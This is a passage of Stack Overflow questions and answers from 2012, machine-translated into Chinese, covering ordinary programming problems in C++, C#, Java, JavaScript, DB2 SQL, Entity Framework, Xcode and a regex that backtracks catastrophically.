> 时间：2012-06-18T22:40:41.707

我认为您应该能够遵循相同的做法来提高 UITableView 的滚动性能。

手动绘制，每个单元格中只有一个视图。

查看以下 SO 帖子，其中讨论了通过以特定方式呈现单元格来提高滚动性能的多种方法。

[提高 iPhone UITableView 滚动性能的技巧？](https://stackoverflow.com/questions/1352479/tricks-for-improving-iphone-uitableview-scrolling-performance)

# c++ - 绘制波形 - 转换为 DB 压缩它

> ID：11091924
> 
> 赞同：1
> 
> 时间：2012-06-18T22:20:13.313
> 
> 标签：c++, audio, waveform

我有一个波形文件，我有一个函数可以检索每个像素 2 个样本，然后我用它们画线。在我处理缩放之前快速而轻松。我可以显示幅度值没问题

![在此处输入图像描述](../Images/3dae2cdd03d01fda0f9cf8da98d39e0c.png)

这是波形的准确图像。为此，我使用了以下代码

```
//tempAllChannels[numOfSamples] holds amplitude data for the entire wav
//oneChannel[numOfPixels*2] will hold 2 values per pixel in display area, an average of min amp, and average of max
for(int i = 0; i < numOfSamples; i++)//loop through all samples in wave file
{
    if (tempAllChannels[i] < 0) min += tempAllChannels[i];//if neg amp value, add amp value to min
    if (tempAllChannels[i] >= 0) max += tempAllChannels[i]; 

    if(i%factor==0 && i!=0)     //factor is (numofsamples in wav)/(numofpixels) in display area
    {
        min = min/factor;       //get average amp value
        max = max/factor;
        oneChannel[j]=max;
        oneChannel[j+1]=min;
        j+=2;                   //iterate for next time
        min = 0;                //reset for next time
        max = 0;
    }   
} 
```

这很好，但我需要在 db 中显示，所以更安静的波形图像不会小得可笑，但是当我对上面的代码进行以下更改时

```
oneChannel[j]=10*log10(max);
oneChannel[j+1]=-10*log10(-min); 
```

波浪图像看起来像这样。

![在此处输入图像描述](../Images/dac9fe58bf4264b57090d8ff93d94750.png)

这不准确，看起来它被压扁了。我在做什么有问题吗？我需要找到一种在保持动态的同时将振幅转换为分贝的方法。我想我不应该在转换为 DB 时取平均值。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T15:34:29.713

不要转换为 dB 以获得概览。没有人这样做。

您应该找到绝对值的最大值，而不是找到一个块的平均值。通过平均，您将在高频峰值中损失很多幅度。

# xcode - Xcode的黄色查找结果矩形有可用的方法吗？

> ID：11091926
> 
> 赞同：-1
> 
> 时间：2012-06-18T22:20:22.633
> 
> 标签：xcode, cocoa, nstextview

> **可能重复：**
> [NSTextView 中类似搜索的突出显示](https://stackoverflow.com/questions/10670240/search-like-highlighting-in-nstextview)

几个月前我以为我在这里读到了此功能的可可方法，但现在我找不到它，或者搜索它的常用词太多。`NSTextView`在, or`NSText`或中什么也没有`NSAttributedString`。

我做这个*梦*吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T01:11:56.943

```
- (void)showFindIndicatorForRange:(NSRange)charRange 
```

*   [NSTextView 中类似搜索的高亮显示](https://stackoverflow.com/questions/10670240/search-like-highlighting-in-nstextview/10670258#10670258)

除非这是一个不同的问题，否则我将您的问题标记为重复！

# asp.net-mvc-3 - 当被跟踪的实体发生变化时，是否会自动调用 Context.SaveChanges？

> ID：11091933
> 
> 赞同：3
> 
> 时间：2012-06-18T22:21:01.600
> 
> 标签：asp.net-mvc-3, entity-framework

**如果实体属性在控制器操作中发生更改并且未调用 Update/SaveChanges，该实体会自动更新吗？**

我正在使用带有存储库模式的 EF 4.1。我在 EfRepository 类中处理所有 CRUD 操作，如下所示：

```
public void Update(T entity)
{
  try{_context.SaveChanges();}
  catch{//do stuff}
}

//etc. 
```

在我的应用程序中，我有一个 ajax/ActionResult 调用，它从数据库中获取一个实体，执行一些基本计算，并返回一个 JSON 对象。长话短说，我在我的 ActionResult 中使用的静态助手中发现了一个错误，该错误正在更改我的实体上的属性值，而不是我返回的 JSON 模型。

我的操作方法没有更新方法，但每次调用此操作时都会更新我的实体。使用 Sql Profiler，我确认了一个更新语句，该语句专门用于更新我的实体和我的错误静态方法正在更改的 one(1) 属性。

我在我的存储库类中的 Update 方法处放置了一个断点，即使我的实体正在由 EF 更新，我的 Update 方法也从未被调用。IDbSet 中接口方法“Find”（我使用的）的摘要说，

> 查找具有给定主键值的实体。如果上下文中存在具有给定主键值的实体，则立即返回它而不向存储区发出请求。否则，将向存储请求具有给定主键值的实体，如果找到该实体，则将其附加到上下文并返回。如果在上下文或存储中未找到实体，则返回 null。

[这里](http://blogs.msdn.com/b/adonet/archive/2011/01/29/using-dbcontext-in-ef-feature-ctp5-part-4-add-attach-and-entity-states.aspx)也有一些很好的例子。

我认为鉴于我的实体已附加，我的问题的简短回答是“是”。但是对于 EF 来说有点新，我发现这是一个非常难以弄清楚的错误，因为它仍然似乎在幕后发生了一些我无法追踪的事情。我犹豫将其作为一个问题发布，但认为更有知识的人可以扩展我假设的“是”答案，并至少帮助遇到此问题的其他人。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-18T22:33:33.653

> 如果实体属性在控制器操作中发生更改并且未调用 Update/SaveChanges，该实体会自动更新吗？

不，ef 只会在 SaveChanges 调用上将您的更改传播到数据库。保存只能手动进行（即您必须显式调用 SaveChanges）。

What is really important to understand though is that SaveChanges saves *all* current modifications to the context. This means if you are sharing a context your changes will be saved when anyone (not just you) calls SaveChanges.

# javascript - 不触发 OnClick 事件 IE8 但在 Firefox 中运行良好

> ID：11091942
> 
> 赞同：0
> 
> 时间：2012-06-18T22:22:19.243
> 
> 标签：javascript, html

```
 var hyp = document.createElement("a");
  //hyp.style.cssText='cursor:pointer';
  hyp.onclick="RemoveDv('" + divid + "');";    
  hyp.innerHTML = "Remove"; 
```

我有带有这段代码片段的javascript。在 Firefox 中一切正常，但在 IE8 中，如果我在本地运行它，它工作正常，但是将代码上传到服务器并通过我在本地运行它的同一个 IE8 浏览器运行 RemoveDv 事件不会触发。

这是从此 javascript 创建的 html

```
<a style="cursor: pointer;" onclick="RemoveDv('dv1');"> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-18T22:25:17.890

`onclick`应该是一个函数，而不是一个字符串。

```
hyp.onclick = function() {RemoveDv(divid);}; 
```

编辑：嘿，这是我的第 2,000 个答案！

# asp.net - 将 asp.net 应用程序发布到服务器后，数据库访问时间很长

> ID：11091951
> 
> 赞同：1
> 
> 时间：2012-06-18T22:23:50.000
> 
> 标签：asp.net, entity-framework

我有一个非常简单的 asp.net 应用程序，它读取数据库表并显示有关页面加载记录的一些信息。目前演示数据库仅包含 2 条记录用于测试。我正在使用实体框架，并且在本地运行时页面加载非常快<< 1 秒在我将应用程序从我在调用周围放入的跟踪中部署到服务器后，循环遍历 ObjectSet 每条记录大约需要 45 秒。我正在努力找出导致这种延迟的原因。

更新：

这是使用 MS SQL

我在每一行代码周围放置了跟踪输出，只有 1 行有任何明显的延迟：

```
// this isnt fancy just extending ObjectContext
var databaseEntities = new myTableDatabaseEntities(); 
var myClassObjectSet = databaseEntities.MyRecords;

// This following call takes 44seconds per record in the database 
// so with my 2 records takes 88 seconds
var myRecords = myClassObjectset.ToList(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:50:03.167

您是否在没有包装类的情况下尝试过`myTableDatabaseEntities`？这将证明你的包装类是否有问题：

```
// var databaseEntities = new myTableDatabaseEntities();
var databaseEntities = new ObjectContext(); 
```

然后检查它是否仍然很慢。

# sql - DB2 在存储过程中声明/设置变量

> ID：11091952
> 
> 赞同：1
> 
> 时间：2012-06-18T22:23:51.220
> 
> 标签：sql, stored-procedures, db2

我无法编译这个存储过程，我只想声明并设置一个将在 proc 中使用的变量。注意：shipNo 是唯一的传入参数，并且是 VARCHAR(32)。

```
P1: BEGIN
DECLARE @likeShipNo VARCHAR(32);
SET likeShipNo = '%' || shipNo || '%';

DECLARE cursor1 CURSOR WITH RETURN FOR
    SELECT ADV_SHIP_NOTICE_NO,
        VNDR_ID,
        LOC,
        CARR_CD,
        CARR_PRO_NO,
        BL_NO,
        SHIP_EQUIP_ID,
        TS_LOAD

        FROM TRITS

        WHERE ADV_SHIP_NOTICE_NO LIKE(@likeShipNo); 
OPEN cursor1;
END P1 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-19T01:31:51.787

DB2 中的变量不需要像 MSSQL 中的 @ 。另外，当你返回一个游标时，你需要`RESULT SET 1`在begin前加上句子，然后`WITH RETURN TO CLIENT`在你想返回的游标上加上。该过程应如下所示：

```
CREATE BEGIN MYSCHEMA.MYPROC (
    IN shipNo VARCHAR(30) )
BEGIN
    DECLARE likeShipNo VARCHAR(32);

    SET likeShipNo = '%' || shipNo || '%';

    DECLARE cursor1 CURSOR WITH RETURN TO CLIENT FOR
        SELECT
            ADV_SHIP_NOTICE_NO,
            VNDR_ID,
            LOC,
            CARR_CD,
            CARR_PRO_NO,
            BL_NO,
            SHIP_EQUIP_ID,
            TS_LOAD
        FROM
            TRITS
        WHERE
            ADV_SHIP_NOTICE_NO LIKE likeShipNo;
    OPEN cursor1;
END; 
```

# java - 使用 Java 从 FTP 下载时文件不完整

> ID：11091954
> 
> 赞同：0
> 
> 时间：2012-06-18T22:23:53.607
> 
> 标签：java, ftp, download

在我的应用程序中，我将一个 byte[]（序列化对象）上传到我的 FTP 服务器，它运行良好。但是，当我尝试下载它时，只有数组的第一部分（如 3000 字节）是正确的，其余部分用零填充。

我似乎无法弄清楚出了什么问题，任何帮助将不胜感激。我正在使用包 org.apache.commons.net.*

```
public static byte[] downloadBoard( String host, int port, String usr, String pwd) throws IOException {
  FTPClient ftpClient = new FTPClient();
  byte[] buf = new byte[20000];

  try {
    ftpClient.connect( host, port );
    ftpClient.login( usr, pwd );

    ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
    InputStream is = ftpClient.retrieveFileStream("asdf.board");
    is.read(buf);
    is.close();

    ftpClient.completePendingCommand();
    ftpClient.logout();
  } finally {
    ftpClient.disconnect();
  }
  return buf;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:26:02.193

`InputStream.read()`通常**不会**为您读取整个流，而只会读取其中的一部分。请注意，[InputStream.read()返回](http://docs.oracle.com/javase/6/docs/api/java/io/InputStream.html#read%28byte%5b%5d%29)**实际读取**的字节数，您需要对其进行检查。

典型的模式是循环直到`InputStream`报告没有更多字节可用。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-18T22:28:56.000

is.read() 可能不会返回完整内容。您需要将 read() 放入类似于此的循环中：

```
int pos = 0;
while (true) {
  int count = is.read(buf, pos, buf.length - pos);
  if (count <= 0) {
    break;
  }
  pos += count;
} 
```

PS：

如果您知道文件的大小，则可以使用 DataInputStream 读取缓冲区而无需循环：

```
byte[] buf = new byte[exactFileSize];
DataInputStream dis = new DataInputStream(is);
dis.readFully(buf); 
```

# javascript - Rally App SDK 2.0：用于不显示 displayField 的用户的 rallymultiobjectpicker

> ID：11091961
> 
> 赞同：0
> 
> 时间：2012-06-18T22:25:08.563
> 
> 标签：javascript, extjs, rally

我正在尝试创建一个列出工作区用户的 rallymultiobjectpicker。但是，无论它在 listCfg 中设置为什么，它似乎都没有为 displayField 加载任何值。文档指定默认值为“名称”，我已切换为“名字”、“对象ID”、“显示名称”、“_refObjectName”等。似乎没有任何更改反映，因为 div 应该包含displayField 的值保持为空。我已经检查了对象，这里是一个典型返回的示例（所有空字段都是生成的并且没有修改）：

```
->Object
    CreationDate: null
    Disabled: false
    DisplayName: ""
    EmailAddress: ""
    FirstName: ""
    LastName: ""
    LastPasswordUpdateDate: null
    MiddleName: ""
    ObjectID: 1234567890
    OnpremLdapUsername: ""
    RevisionHistory: ""
    Role: ""
    ShortDisplayName: ""
    Subscription: ""
    TeamMemberships: ""
    UserName: ""
    UserPermissions: ""
    UserProfile: ""
    _objectVersion: "12"
    _p: "2"
    _ref: "https://rally1.rallydev.com/slm/webservice/1.33/user/1234567890.js"
    _refObjectName: "John D"
    _type: "user"
    creatable: false
    deletable: false
    groupSelected: "Available"
    matchedText: undefined
    updatable: true
    __proto__: Object 
```

以下是使用的代码示例：

```
Ext.widget('rallymultiobjectpicker', {
    modelType: 'user',
    fieldLabel: 'Owners',
    listCfg: {displayField: "DisplayName", autoScroll: true},
    stateful: false,
    labelWidth: 50,
}); 
```

**编辑**：使用与下面答案中列出的配置类似的配置，此问题在 2.0p3 中再次出现。尽管在 listCfg 中指定了 displayField，但没有显示选项文本。我还应该注意，过滤器/customQuery 似乎完全被破坏了，因为它们不能限制我在另一个 rallymultiobjectpicker 中的数据集。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-19T22:29:55.210

您必须指定从服务器获取 displayField 的数据存储配置。您必须指定整个商店配置，而不仅仅是 fetch 参数。您还必须为 filterFieldName 传递一个配置选项，以使自动完成功能正常工作。示例配置如下：

```
Ext.widget('rallymultiobjectpicker', {
    modelType: 'user',
    fieldLabel: 'Owners',
    filterFieldName: 'DisplayName',
    storeCfg: {
        autoLoad: false,
        fetch: 'DisplayName',
        pageSize: 200,
        sorters: [
            {
                property: 'DisplayName',
                direction: 'ASC'
            }
        ],
        remoteGroup: false,
        remoteSort: false,
        remoteFilter: false,
        limit: Infinity
    },
    listCfg: {
        displayField: 'DisplayName'
    },
    stateful: false,
    labelWidth: 50
}); 
```

# c# - C# 正则表达式回溯/

> ID：11091966
> 
> 赞同：0
> 
> 时间：2012-06-18T22:25:25.273
> 
> 标签：c#, regex

我有一个格式如下的字符串，当匹配时，regex.macth 静态方法运行得非常快。然而，有时会有一个不匹配的字符串，我正在运行一些场景，它进入回溯并且 regex.match 似乎永远不会结束。当字段不按顺序并且某些字段不存在时的特定情况。我必须使用正则表达式，想知道是否有人有任何提示？此外，我只检索几个组值，例如 7。好吧，我的数据看起来像上面那样，当它匹配 exaclty 时它运行良好，例如 10000 没有问题，我对此感到满意，当格式可能不同时例如，某些字段（例如最后四个字段）不存在，或者某些字段的排序不同，在此 regex.match 中将永远运行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-18T22:35:07.823

您可以尝试使用以下内容匹配各个字段名称和值：

```
(\w+)\s+([^}\s]*) 
```

将它们收集到一个`Dictionary`然后从中工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-18T23:35:01.687

我没有可以测试失败的数据。

**更新**

感谢您的示例，我现在看到了问题。基本上，正则表达式具有可选匹配的重叠集。这是子表达式`\s*([^}]*?)`。当像这样的重叠字符类组合在一起时，它可能会导致灾难性的回溯。在这种情况下，正则表达式充满了空白引用。

解决方案是当可选部分不能从回溯中受益（但只会伤害它）时，强制某些部分不返回给回溯器。使节原子化具有使其成为文字的效果。在这种情况下，修剪部分会导致问题，将它们从回溯中删除并解决问题。

但是，为了正确修剪，需要更改 \s* 表达式。

@Alan Moore 提到 .NET 中没有占有量词。
他是对的，所以使用下面的“原子分组”正则表达式。

原子分组版本：

```
TEST_REPLICATE\s*{\s*REPLICATE_ID(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*ASSAY_NUMBER(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*ASSAY_VERSION(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*DILUTION_ID(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*SAMPLE_ID(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*SAMPLE_TYPE(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*TEST_ORDER_DATE(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*TEST_ORDER_TIME(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*TEST_INITIATION_DATE(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*TEST_INITIATION_TIME(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*TEST_COMPLETION_DATE(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*TEST_COMPLETION_TIME(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*ASSAY_CALIBRATION_DATE(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*ASSAY_CALIBRATION_TIME(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*TRACK(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*PROCESSING_LANE(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*MODULE_SN(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*LOAD_LIST_NAME(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*OPERATOR_ID(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*DARK_SUBREADS(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*SIGNAL_SUBREADS(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*DARK_COUNT(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*SIGNAL_COUNT(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*CORRECTED_COUNT(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*STD_BAK(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*AVG_BAK(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*STD_FOR(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*AVG_FOR(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*SHAPE(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*EXCEPTION_STRING(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*RESULT(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*REPORTED_RESULT(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*REPORTED_RESULT_UNITS(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*REAGENT_MASTER_LOT(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*REAGENT_SERIAL_NUMBER(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*RESULT_FLAGS(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*RESULT_INTERPRETATION(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*DILUTION_PROTOCOL(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*RESULT_COMMENT(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*DATA_MANAGEMENT_FIELD_1(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*DATA_MANAGEMENT_FIELD_2(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*DATA_MANAGEMENT_FIELD_3(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*DATA_MANAGEMENT_FIELD_4(?>[^\S\n]*)([^}\n]*?)(?>[^\S\n]*)\s*} 
```

所有格量词版本：

```
TEST_REPLICATE\s*{\s*REPLICATE_ID[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*ASSAY_NUMBER[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*ASSAY_VERSION[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*DILUTION_ID[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*SAMPLE_ID[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*SAMPLE_TYPE[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*TEST_ORDER_DATE[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*TEST_ORDER_TIME[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*TEST_INITIATION_DATE[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*TEST_INITIATION_TIME[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*TEST_COMPLETION_DATE[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*TEST_COMPLETION_TIME[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*ASSAY_CALIBRATION_DATE[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*ASSAY_CALIBRATION_TIME[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*TRACK[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*PROCESSING_LANE[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*MODULE_SN[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*LOAD_LIST_NAME[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*OPERATOR_ID[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*DARK_SUBREADS[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*SIGNAL_SUBREADS[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*DARK_COUNT[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*SIGNAL_COUNT[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*CORRECTED_COUNT[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*STD_BAK[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*AVG_BAK[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*STD_FOR[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*AVG_FOR[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*SHAPE[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*EXCEPTION_STRING[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*RESULT[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*REPORTED_RESULT[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*REPORTED_RESULT_UNITS[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*REAGENT_MASTER_LOT[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*REAGENT_SERIAL_NUMBER[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*RESULT_FLAGS[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*RESULT_INTERPRETATION[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*DILUTION_PROTOCOL[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*RESULT_COMMENT[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*DATA_MANAGEMENT_FIELD_1[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*DATA_MANAGEMENT_FIELD_2[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*DATA_MANAGEMENT_FIELD_3[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*DATA_MANAGEMENT_FIELD_4[^\S\n]*+([^}\n]*?)[^\S\n]*+\s*} 
```

用组号扩展：（
这看起来可能有点痛苦）

```
 TEST_REPLICATE\s*
     {\s*
     REPLICATE_ID
     (?> [^\S\n]* )
1    ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*ASSAY_NUMBER
     (?> [^\S\n]* )
2    ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*ASSAY_VERSION
     (?> [^\S\n]* )
3    ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*DILUTION_ID
     (?> [^\S\n]* )
4    ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*SAMPLE_ID
     (?> [^\S\n]* )
5    ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*SAMPLE_TYPE
     (?> [^\S\n]* )
6    ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*TEST_ORDER_DATE
     (?> [^\S\n]* )
7    ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*TEST_ORDER_TIME
     (?> [^\S\n]* )
8    ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*TEST_INITIATION_DATE
     (?> [^\S\n]* )
9    ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*TEST_INITIATION_TIME
     (?> [^\S\n]* )
10   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*TEST_COMPLETION_DATE
     (?> [^\S\n]* )
11   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*TEST_COMPLETION_TIME
     (?> [^\S\n]* )
12   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*ASSAY_CALIBRATION_DATE
     (?> [^\S\n]* )
13   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*ASSAY_CALIBRATION_TIME
     (?> [^\S\n]* )
14   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*TRACK
     (?> [^\S\n]* )
15   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*PROCESSING_LANE
     (?> [^\S\n]* )
16   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*MODULE_SN
     (?> [^\S\n]* )
17   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*LOAD_LIST_NAME
     (?> [^\S\n]* )
18   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*OPERATOR_ID
     (?> [^\S\n]* )
19   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*DARK_SUBREADS
     (?> [^\S\n]* )
20   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*SIGNAL_SUBREADS
     (?> [^\S\n]* )
21   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*DARK_COUNT
     (?> [^\S\n]* )
22   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*SIGNAL_COUNT
     (?> [^\S\n]* )
23   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*CORRECTED_COUNT
     (?> [^\S\n]* )
24   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*STD_BAK
     (?> [^\S\n]* )
25   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*AVG_BAK
     (?> [^\S\n]* )
26   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*STD_FOR
     (?> [^\S\n]* )
27   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*AVG_FOR
     (?> [^\S\n]* )
28   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*SHAPE
     (?> [^\S\n]* )
29   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*EXCEPTION_STRING
     (?> [^\S\n]* )
30   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*RESULT
     (?> [^\S\n]* )
31   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*REPORTED_RESULT
     (?> [^\S\n]* )
32   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*REPORTED_RESULT_UNITS
     (?> [^\S\n]* )
33   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*REAGENT_MASTER_LOT
     (?> [^\S\n]* )
34   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*REAGENT_SERIAL_NUMBER
     (?> [^\S\n]* )
35   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*RESULT_FLAGS
     (?> [^\S\n]* )
36   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*RESULT_INTERPRETATION
     (?> [^\S\n]* )
37   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*DILUTION_PROTOCOL
     (?> [^\S\n]* )
38   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*RESULT_COMMENT
     (?> [^\S\n]* )
39   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*DATA_MANAGEMENT_FIELD_1
     (?> [^\S\n]* )
40   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*DATA_MANAGEMENT_FIELD_2
     (?> [^\S\n]* )
41   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*DATA_MANAGEMENT_FIELD_3
     (?> [^\S\n]* )
42   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*DATA_MANAGEMENT_FIELD_4
     (?> [^\S\n]* )
43   ( [^}\n]*? )
     (?> [^\S\n]* )
     \s*} 
```

# windows-8 - 如何从 .Net 搜索 Windows 8 联系人？

> ID：11091967
> 
> 赞同：1
> 
> 时间：2012-06-18T22:25:29.877
> 
> 标签：windows-8, windows-runtime, .net-4.5

我正在为 Windows 8 应用程序进行估算，我想以编程方式根据电话号码或电子邮件地址在 Windows 8 联系人存储中搜索一个人的姓名。这在 WinRT/.Net 中可行吗？我似乎找不到 API 的文档来执行此操作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-20T03:56:51.193

你不能这样做。如果要在本地访问联系人，则必须使用[Contact Picker Contract](http://msdn.microsoft.com/en-us/library/windows/apps/jj153343)。这将打开人员中心并让用户选择一个或多个联系人，然后您可以对其进行操作。如果你想搜索用户的联系人，你必须使用[Live Connect APIs](http://msdn.microsoft.com/en-us/live//default.aspx)。查看[交互式 SDK](http://isdk.dev.live.com/ISDK.aspx)和[Build 中的此视频](http://channel9.msdn.com/Events/BUILD/BUILD2011/APP-784T)。

# c# - 为什么 LINQ-to-Entities 将此查询放在子选择中？

> ID：11091968
> 
> 赞同：7
> 
> 时间：2012-06-18T22:25:30.060
> 
> 标签：c#, linq, linq-to-entities, sybase

我有以下 LINQ 查询：

```
var queryGroups = (from p in db.cl_contact_event
                   select new Groups { inputFileName = p.input_file_name }).Distinct(); 
```

运行时转换为以下内容：

```
SELECT 
[Distinct1].[C1] AS [C1], 
[Distinct1].[input_file_name] AS [input_file_name]
FROM ( SELECT DISTINCT 
       [Extent1].[input_file_name] AS [input_file_name], 
       1 AS [C1]
       FROM [mel].[cl_contact_event] AS [Extent1]
)  AS [Distinct1] 
```

现在我很确定存在子选择的原因是因为我有基本的 LINQ 查询由 () 包围，然后执行 .Distinct() 但我对 LINQ 的了解不够，无法确定这一点。如果确实如此，有没有办法重组/编码我的查询，以便不会发生子选择？

我知道我似乎只是在这里吹毛求疵，但我只是好奇。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T22:35:11.940

我根本不会担心这种特殊情况。SQL Server（很可能是任何企业数据库）无论如何都会优化外部 Select 语句。我认为生成此 SQL 语句的原因是因为这是最通用和可重用的语句。根据我的经验，这总是发生在`Distinct()`.

* * *

## 回答 #2

> 赞同：4
> 
